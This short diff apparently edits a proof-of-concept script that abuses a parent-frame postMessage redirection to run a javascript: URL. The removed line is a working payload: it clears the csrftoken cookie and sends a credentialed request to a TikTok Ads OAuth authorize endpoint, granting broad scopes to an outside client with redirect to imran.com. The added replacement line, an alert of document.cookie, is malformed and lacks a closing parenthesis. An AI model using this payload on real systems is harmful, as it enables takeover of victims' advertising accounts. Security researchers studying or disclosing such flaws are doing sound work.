@@ -1,6 +1,6 @@
 <script>
 parent.postMessage({
     action: "requestRedirectionTo",
-    targetUrlStr: "javascript:document.cookie='csrftoken=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/';fetch('https://ads.tiktok.com/marketing_api/api/advertiser/authorize/?msToken=&X-Bogus=&_signature=',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({'scope':[10000,1,2,4,6,7,8,3,9,18000000,15000000,12000000,19000000,5,13000000,14000000,16000000,17000000,'7043626160646946818','7050363942434013185','7263200645266554881','7294180478502830081','7302558519668703234','7336834092152913922','7420916749769408513'],'redirect':true,'state':'your_custom_params','timezone_name':'Asia/Kolkata','browser_language':'en-US','cookie_enabled':true,'screen_width':1710,'screen_height':955,'browser_platform':'MacIntel','browser_name':'Mozilla','browser_version':'5.0 (Macintosh)','initial_timestamp':'1746595155153','client_id':'7480799711721439248','user_type':1,'redirect_uri':'https://imran.com'})}).then(response=>response.text()).then(alert).catch(console.error);"
+    targetUrlStr: "javascript:alert(document.cookie"
 }, "*");
 </script>
